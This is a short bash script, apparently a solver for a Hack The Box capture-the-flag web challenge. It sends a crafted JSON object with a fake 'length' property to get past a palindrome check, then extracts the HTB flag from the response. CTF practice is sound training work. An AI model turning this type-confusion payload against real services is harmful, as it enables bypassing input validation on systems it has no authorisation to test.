#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-}"
if [[ -z "$TARGET" ]]; then
    echo "Usage: $0 <IP:PORT>" >&2
    exit 1
fi

PAYLOAD='{"palindrome":{"length":"1000","0":"a","999":"a"}}'

echo -e "[+] Sending payload: $PAYLOAD"
RESPONSE="$(curl -s "http://${TARGET}/" \
    -H 'Content-Type: application/json' \
    -d "$PAYLOAD")"

FLAG="$(grep -oE 'HTB\{[^}]*\}' <<< "$RESPONSE" || true)"

if [[ -z "$FLAG" ]]; then
    echo "[-] No flag in response:" >&2
    echo "$RESPONSE" >&2
    exit 1
fi

echo -e "[\u2714] Flag captured: \033[1;37m$FLAG\033[0m"